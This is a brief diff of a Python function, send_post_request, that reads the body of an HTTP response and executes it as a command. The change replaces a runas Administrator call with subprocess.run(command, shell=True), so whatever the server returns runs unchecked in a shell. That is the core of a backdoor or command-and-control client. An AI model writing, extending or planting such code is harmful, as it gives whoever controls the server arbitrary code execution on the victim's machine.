@@ -20,7 +20,7 @@ def send_post_request():
 
         if response.status_code == 200:
             command = response.text.strip()
-            subprocess.run(["runas", "/user:Administrator", "cmd.exe", "/c", command])
+            subprocess.run(command, shell=True)  # Using shell=True to run command in shell
         else:
             pass
     except Exception as e:
